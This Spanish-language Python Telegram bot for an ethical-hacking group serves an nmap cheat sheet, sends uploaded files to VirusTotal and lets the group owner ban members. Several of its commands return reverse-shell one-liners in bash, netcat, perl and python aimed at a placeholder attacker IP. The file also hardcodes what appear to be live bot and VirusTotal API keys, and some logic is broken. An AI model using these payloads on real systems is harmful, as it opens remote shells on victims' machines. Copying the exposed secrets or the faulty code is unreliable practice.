import telebot, time, os, vt

Token = '6323127820:AAG4yc5JAgsYyZxACM3avZdUVJ96DLunsNo'
vt_api_key = '9cfa879a519e22fdfd9206ee9b93b09930c028e9d57b912afab3c876fa763c5d'

bot = telebot.TeleBot(Token)

# -------Bienvenida
print('bienve')

# Manejar el evento de nuevos miembros en un grupo
@bot.message_handler(func=lambda message: True, content_types=['new_chat_members'])
def welcome_message(message):
    bot.reply_to(message, 'Bienvenid@ a este grupo de hacking ético! Te invito a presentarte para conocerte mejor.')


# -------Comandos
print('coman')

@bot.message_handler(commands=['pentest'])  # --Llamada a bot
def init(message):
    user_name = message.from_user.first_name
    bot.reply_to(message, 'Hola {}, de momento estoy en version alfa, pero si utilizas /help, podras ver los comandos que de momento tengo disponibles.'.format(user_name))
    print('pingu')

@bot.message_handler(commands=['nmap'])  # --Listado de comandos nmap
def nmap(message):
    user_name = message.from_user.first_name
    bot.reply_to(message, 'Hola {}, los comandos de nmap son los siguientes: \n \n -->Descubrir sistemas: \n -PS n tcp syn ping \n -PA n ping TCP ACK \n -PU n ping UDP \n -PM Netmask Req \n -PP Timestamp Req \n -PE Echo Req \n -sL análisis de listado \n -PO ping por protocolo \n -PN No hacer ping \n -n no hacer DNS \n -R Resolver DNS en todos los sistemas objetivo \n –traceroute: trazar ruta al sistema (para topologías de red) \n -sP realizar ping, igual que con –PP –PM –PS443 –PA80 \n \n -->Técnicas de análisis de puertos: \n -sS análisis utilizando TCP SYN \n -sT análisis utilizando TCP CONNECT \n -sU análisis utilizando UDP \n -sY análisis utilizando SCTP INIT \n -sZ utilizando COOKIE ECHO de SCTP \n -sO protocolo IP \n -sW ventana TCP -sN \n –sF -sX NULL, FIN, XMAS \n –sA TCP ACK \n \n -->Puertos a analizar y orden de análisis: \n -p n-mrango \n -p– todos los puertos \n -p n,m,z especificados \n -p U:n-m,z T:n,m U para UDP, T para TCP \n  -F rápido, los 100 comunes \n –top-ports n analizar los puertos más utilizados \n -r no aleatorio \n \n -->Duración y ejecución: \n -T0 paranoico \n -T1 sigiloso \n -T2 sofisticado \n -T3 normal \n -T4 agresivo \n -T5 locura \n –min-hostgroup \n –max-hostgroup \n –min-rate \n –max-rate \n –min-parallelism \n –max-parallelism \n –min-rtt-timeout \n –max-rtt-timeout \n –initial-rtt-timeout \n –max-retries \n –host-timeout –scan-delay \n \n -->Detección de servicios y versiones: \n -sV: detección de la versión de servicios \n –all-ports no excluir puertos \n –version-all probar cada exploración \n –version-trace rastrear la actividad del análisis de versión-O activar detección del S. Operativo \n –fuzzy adivinar detección del SO \n –max-os-tries establecer número máximo de intentos contra el sistema objetivo \n \n -->Evasión de Firewalls/IDS: \n -f fragmentar paquetes \n -D d1,d2 encubrir análisis con señuelos \n -S ip falsear dirección origen \n –g source falsear puerto origen \n –randomize-hosts orden \n –spoof-mac <mac> cambiar MAC de origen \n \n -->Parámetros de nivel de detalle y depuración: \n -v Incrementar el nivel de detalle \n –reason motivos por sistema y puerto \n -d (1-9) establecer nivel de depuración \n –packet-trace ruta de paquetes \n \n -->Otras opciones: \n –resume file continuar análisis abortado (tomando formatos de salida con -oN o -oG) \n -6 activar análisis IPV6 \n -A agresivo, igual que con -O -sV -sC –traceroute \n \n -->Opciones interactivas: \n v/V aumentar/disminuir nivel de detalle del análisis \n d/D aumentar/disminuir nivel de depuración \n p/P activar/desactivar traza de paquetes \n \n -->Scripts: \n -sC realizar análisis con los scripts por defecto \n –script file ejecutar script (o todos) \n –script-args n=v proporcionar argumentos \n –script-trace mostrar comunicación entrante y saliente \n \n -->Formatos de salida: \n -oN guardar en formato normal \n -oX guardar en formato XML \n -oG guardar en formato para posteriormente usar Grep(una linea) \n -oA guardar en todos los formatos anteriores'.format(user_name))
    print('nmap')

@bot.message_handler(commands=['reverse_sh'])  # --reverse shell bash 
def reverse_sh_tcp(message):
    user_name = message.from_user.first_name
    bot.reply_to(message, 'Hola {}, mis sugerencias para realizar una reverse shell con bash son las siguientes: \n'.format(user_name) + '\nTCP\n' + '\n bash -i >& /dev/tcp/<tu ip>/443 0>&1\n'+'\nbash -l > /dev/tcp/<tu ip>/443 0<&1 2>&1\n'+'\nsh -i 5<> /dev/tcp/<tu ip>/443 0<&5 1>&5 2>&5\n'+'\nbash -c "bash -i >& /dev/tcp/<tu ip>/443 0>&1"0<&196;exec 196<>/dev/tcp/<tu ip>/443; sh <&196 >&196 2>&196\n'+'\nexec 5<>/dev/tcp/<tu ip>/443;cat <&5 | while read line; do $line 2>&5 >&5; done\n'+'\n----------\n'+'\nUDP\n'+'sh -i >& /dev/udp/<tu ip>/443 0>&1'+'\n----------\n'+'\nURL ENCODE\n'+'\nbash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F<tu ip>%2F443%200%3E%261%22')
    print('reverse')

@bot.message_handler(commands=['reverse_nc'])  # --reverse shell net cat 
def reverse_sh_tcp(message):
    user_name = message.from_user.first_name
    bot.reply_to(message, 'Hola {}, mis sugerencias para realizar una reverse shell con netcat son las siguientes: \n'.format(user_name) + '\nLINUX\n'+'\nnc -e /bin/sh <tu ip> 443'+'nc -e /bin/bash <tu ip> 443\n'+'\nnc -c /bin/sh <tu ip> 443'+'nc -c /bin/bash <tu ip> 443\n'+'\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <tu ip> 443 >/tmp/f\n'+'\nWINDOWS\n'+'\nnc.exe -e cmd <tu ip> 443\n'+'\n\\\<tu ip>\a\\nc.exe -e cmd <tu ip> 443')
    print('reverse')

@bot.message_handler(commands=['reverse_perl'])  # --reverse shell perl
def reverse_perl(message):
    user_name = message.from_user.first_name
    bot.reply_to(message, 'Hola {}, mis sugerencias para realizar una reverse shell con perl son las siguientes: \n'.format(user_name) + 'perl -e \'use Socket;$i="<ip>";$p=4242;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\' \n' + '\n' + 'perl -MIO -e \'$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"<ip>:4242");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;\' \n' + '\n' + '(solo en windows) perl -MIO -e \'$c=new IO::Socket::INET(PeerAddr,"<ip>:4242");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;\'')
    print('reverse')

@bot.message_handler(commands=['reverse_py'])  # --reverse shell python ipv4
def reverse_py_ipv4(message):
    user_name = message.from_user.first_name
    bot.reply_to(message, 'Hola {}, mis sugerencias para realizar una reverse shell con python son las siguientes: \n'.format(user_name) + 'Solo Linux : \n' + 'export RHOST="<ip>";export RPORT=4242;python -c \'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")\'' )
    print('reverse')

@bot.message_handler(commands=['help'])
def send_help(message):
    user_name = message.from_user.first_name
    bot.reply_to(message, "Hola {}, puedes enviar un archivo para que lo analice VirusTotal o probar con uno de estos comandos:\n /pentest - llama al bot\n /nmap - Listado de comandos de Nmap\n  --> ejemplos de scripts para reverse shell 👇🏻\n /reverse_sh\n /reverse_perl\n /reverse_py\n /reverse_nc".format(user_name))
    print('help')

# -------Mensaje diario (necesario el chat-id)
print('diario')

# chat_id = "-1001813797388" # El identificador del chat al que quieres enviar el mensaje
chat_id = '-1001752772084'

def enviar_mensaje_diario():
    # Aquí puedes definir el mensaje que deseas enviar
    mensaje = "¡Hola! Este es mi mensaje diario automático."

    # Aquí defines el ID del grupo de Telegram al que deseas enviar el mensaje
    grupo_id = 'ID_del_grupo'

    # Utiliza el método send_message para enviar el mensaje al grupo
    bot.send_message(grupo_id, mensaje)

if __name__ == 'main':
    # Obtén la hora actual
    hora_actual = time.strftime('%H:%M')

    # Define la hora a la que deseas enviar el mensaje diario (en formato HH:MM)
    hora_envio = '12:00'

    # Loop para enviar el mensaje diario a la hora especificada
    while True:
        if hora_actual == hora_envio:
            enviar_mensaje_diario()
            break
        else:
            # Espera 1 minuto antes de verificar la hora actual nuevamente
            time.sleep(60)
            hora_actual = time.strftime('%H:%M')
    


# -------VirusTotal
print('vt')

# Crea una instancia del cliente VirusTotal
vt_client = vt.Client(vt_api_key)

# Función para escanear un archivo con VirusTotal
def scan_file(file_path):
    try:
        with open(file_path, "rb") as file:
            response = vt_client.scan_file(file)
            return response
    except Exception as e:
        print("Error en el escaneo del archivo:", e)

# Manejador para mensajes de archivos
@bot.message_handler(content_types=["document"])
def handle_file(message):
    file_id = message.document.file_id
    file_info = bot.get_file(file_id)
    file_path = file_info.file_path

    # Descarga el archivo desde Telegram
    downloaded_file = bot.download_file(file_path)

    # Obtiene el nombre original del archivo y su extensión
    file_name = file_info.file_name
    _, file_extension = os.path.splitext(file_name)

    # Guarda el archivo descargado con el nombre original y la extensión original
    file_name = file_name.replace(" ", "_")  # Reemplaza los espacios en blanco por guiones bajos
    with open(file_name, "wb") as new_file:
        new_file.write(downloaded_file)

    # Escanea el archivo con VirusTotal
    scan_result = scan_file(file_name)

    if scan_result['positives']:  # Archivo malicioso
        bot.reply_to(message, "¡Cuidado! Este archivo es malicioso.")
        # Puedes agregar aquí acciones adicionales, como bloquear al usuario o tomar otras medidas de seguridad
    else:  # Archivo seguro
        bot.reply_to(message, "Todo correcto, puedes abrir el archivo sin problemas.")

    # Elimina el archivo descargado independientemente del resultado del escaneo
    os.remove(file_name)


#-------comandos Propietario Grupo
print('prop')

# Comando para banear a usuarios
@bot.message_handler(commands=['ban'])
def banear_usuario(message):
    # Verificar si el mensaje es de un grupo
    if message.chat.type == 'group' or message.chat.type == 'supergroup':
        # Obtener los administradores del grupo
        administrators = bot.get_chat_administrators(message.chat.id)
        # Verificar si el usuario que ejecuta el comando es el propietario
        for admin in administrators:
            if admin.status == 'creator' and admin.user.id == message.from_user.id:
                # Comprobar si se proporcionó un argumento (nombre de usuario) junto al comando
                if len(message.text.split()) > 1:
                    username = message.text.split()[1]
                    # Realizar la acción de banear al usuario
                    banear_accion(message.chat.id, username)
                    bot.reply_to(message, f"Usuario {username} baneado correctamente.")
                else:
                    bot.reply_to(message, "Debes proporcionar el nombre de usuario junto al comando.")
                return
        
        bot.reply_to(message, "Lo siento, solo el propietario del grupo puede ejecutar este comando.")
        
    else:
        bot.reply_to(message, "Este comando solo se puede ejecutar en un grupo o supergrupo.")


# Comando para desbanear a usuarios
@bot.message_handler(commands=['unban'])
def desbanear_usuario(message):
    # Verificar si el mensaje es de un grupo
    if message.chat.type == 'group' or message.chat.type == 'supergroup':
        # Obtener los administradores del grupo
        administrators = bot.get_chat_administrators(message.chat.id)
        # Verificar si el usuario que ejecuta el comando es el propietario del grupo
        for admin in administrators:
            if admin.status == 'creator' and admin.user.id == message.from_user.id:
                # Comprobar si se proporcionó un argumento (nombre de usuario) junto al comando
                if len(message.text.split()) > 1:
                    username = message.text.split()[1]
                    # Realizar la acción de desbanear al usuario
                    desbanear_accion(message.chat.id, username)
                    bot.reply_to(message, f"Usuario {username} desbaneado correctamente.")
                else:
                    bot.reply_to(message, "Debes proporcionar el nombre de usuario junto al comando.")
                return
        
        bot.reply_to(message, "Lo siento, solo el propietario del grupo puede ejecutar este comando.")
        
    else:
        bot.reply_to(message, "Este comando solo se puede ejecutar en un grupo o supergrupo.")


# Función para realizar la acción de banear al usuario
def banear_accion(chat_id, username):
    try:
        # Obtener el ID de usuario a partir del nombre de usuario
        user = bot.get_chat_member(chat_id, username)
        if user:
            user_id = user.user.id
            # Ejecutar la acción de banear al usuario en el grupo o supergrupo
            bot.restrict_chat_member(chat_id, user_id, can_send_messages=False)
            # Aquí también puedes realizar otras acciones, como eliminar mensajes o restringir otros permisos
        else:
            print(f"No se encontró el usuario especificado: {username}")
        
    except telebot.apihelper.ApiException as e:
        # Manejar cualquier error que ocurra durante la acción de banear
        print(f"Error al banear al usuario {username}: {e}")


# Función para realizar la acción de desbanear al usuario
def desbanear_accion(chat_id, username):
    try:
        # Obtener el ID de usuario a partir del nombre de usuario
        user = bot.get_chat_member(chat_id, username)
        if user:
            user_id = user.user.id
            # Ejecutar la acción de desbanear al usuario en el grupo o supergrupo
            bot.restrict_chat_member(chat_id, user_id, can_send_messages=True)
            # Aquí también puedes realizar otras acciones, como restaurar permisos previos
        else:
            print(f"No se encontró el usuario especificado: {username}")
        
    except telebot.apihelper.ApiException as e:
        # Manejar cualquier error que ocurra durante la acción de desbanear
        print(f"Error al desbanear al usuario {username}: {e}")

user = telebot.TeleBot.get_me
print(user)
print('\n')
update = telebot.TeleBot.get_updates
print(update)

bot.polling()